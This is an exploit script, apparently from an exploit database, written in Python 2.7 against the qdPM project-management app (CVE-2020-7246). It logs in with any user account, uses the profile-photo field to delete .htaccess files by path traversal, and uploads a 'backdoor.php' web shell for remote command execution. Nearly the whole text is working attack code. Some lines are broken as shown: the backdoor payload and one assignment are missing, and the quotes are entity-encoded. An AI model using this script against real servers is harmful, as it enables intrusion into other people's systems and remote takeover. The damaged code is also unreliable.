# Google Dork: intitle:qdPM 9.1. Copyright Â© 2020 qdpm.net
# Exploit Author: Rishal Dwivedi (Loginsoft)
# Vendor Homepage: http://qdpm.net/
# Software Link: http://qdpm.net/download-qdpm-free-project-management
# Version: <=1.9.1
# Tested on: Windows 10 (Python 2.7)
# CVE : CVE-2020-7246
# Exploit written in Python 2.7
# Tested Environment - Windows 10
# Path Traversal + Remote Code Execution

# Command - qdpm-exploit.py -url http://localhost/ -u user@localhost.com -p password
# -*- coding: utf-8 -*-
#!/usr/bin/python

import requests
from lxml import html
from argparse import ArgumentParser

session_requests = requests.session()

def multifrm(
    userid,
    username,
    csrftoken_,
    EMAIL,
    HOSTNAME,
    uservar,
    ):
    request_1 = {
        &#039;sf_method&#039;: (None, &#039;put&#039;),
        &#039;users[id]&#039;: (None, userid[-1]),
        &#039;users[_csrf_token]&#039;: (None, csrftoken_[-1]),
        &#039;users[name]&#039;: (None, username[-1]),
        &#039;users[new_password]&#039;: (None, &#039;&#039;),
        &#039;users[email]&#039;: (None, EMAIL),
        &#039;extra_fields[9]&#039;: (None, &#039;&#039;),
        &#039;users[remove_photo]&#039;: (None, &#039;1&#039;),
        }
    return request_1


def req(
    userid,
    username,
    csrftoken_,
    EMAIL,
    HOSTNAME,
    ):
    request_1 = multifrm(
        userid,
        username,
        csrftoken_,
        EMAIL,
        HOSTNAME,
        &#039;.htaccess&#039;,
        )
    new = session_requests.post(HOSTNAME + &#039;index.php/myAccount/update&#039;
                                , files=request_1)
    request_2 = multifrm(
        userid,
        username,
        csrftoken_,
        EMAIL,
        HOSTNAME,
        &#039;../.htaccess&#039;,
        )
    new1 = session_requests.post(HOSTNAME + &#039;index.php/myAccount/update&#039;
                                 , files=request_2)
    request_3 = {
        &#039;sf_method&#039;: (None, &#039;put&#039;),
        &#039;users[id]&#039;: (None, userid[-1]),
        &#039;users[_csrf_token]&#039;: (None, csrftoken_[-1]),
        &#039;users[name]&#039;: (None, username[-1]),
        &#039;users[new_password]&#039;: (None, &#039;&#039;),
        &#039;users[email]&#039;: (None, EMAIL),
        &#039;extra_fields[9]&#039;: (None, &#039;&#039;),
        &#039;users[photo]&#039;: (&#039;backdoor.php&#039;,
                         , &#039;application/octet-stream&#039;),
        }
    upload_req = session_requests.post(HOSTNAME
            + &#039;index.php/myAccount/update&#039;, files=request_3)


def main(HOSTNAME, EMAIL, PASSWORD):
    result = session_requests.get(HOSTNAME + &#039;/index.php/login&#039;)
    login_tree = html.fromstring(result.text)
    authenticity_token = \
        list(set(login_tree.xpath("//input[@name=&#039;login[_csrf_token]&#039;]/@value"
             )))[0]
    payload = {&#039;login[email]&#039;: EMAIL, &#039;login[password]&#039;: PASSWORD,
               &#039;login[_csrf_token]&#039;: authenticity_token}
    result = session_requests.post(HOSTNAME + &#039;/index.php/login&#039;,
                                   data=payload,
                                   headers=dict(referer=HOSTNAME
                                   + &#039;/index.php/login&#039;))
    account_page = session_requests.get(HOSTNAME + &#039;index.php/myAccount&#039;
            )
    account_tree = html.fromstring(account_page.content)
    userid = account_tree.xpath("//input[@name=&#039;users[id]&#039;]/@value")
    username = account_tree.xpath("//input[@name=&#039;users[name]&#039;]/@value")
    csrftoken_ = \
        account_tree.xpath("//input[@name=&#039;users[_csrf_token]&#039;]/@value")
    req(userid, username, csrftoken_, EMAIL, HOSTNAME)
    get_file = session_requests.get(HOSTNAME + &#039;index.php/myAccount&#039;)
    final_tree = html.fromstring(get_file.content)
    backdoor = \
    print &#039;Backdoor uploaded at - > &#039; + HOSTNAME + &#039;/uploads/users/&#039; \
        + backdoor[-1] + &#039;?cmd=whoami&#039;


if __name__ == &#039;__main__&#039;:
    parser = \
        ArgumentParser(description=&#039;qdmp - Path traversal + RCE Exploit&#039;
                       )
    parser.add_argument(&#039;-url&#039;, &#039;--host&#039;, dest=&#039;hostname&#039;,
                        help=&#039;Project URL&#039;)
    parser.add_argument(&#039;-u&#039;, &#039;--email&#039;, dest=&#039;email&#039;,
                        help=&#039;User email (Any privilege account)&#039;)
    parser.add_argument(&#039;-p&#039;, &#039;--password&#039;, dest=&#039;password&#039;,
                        help=&#039;User password&#039;)
    args = parser.parse_args()

    main(args.hostname, args.email, args.password)

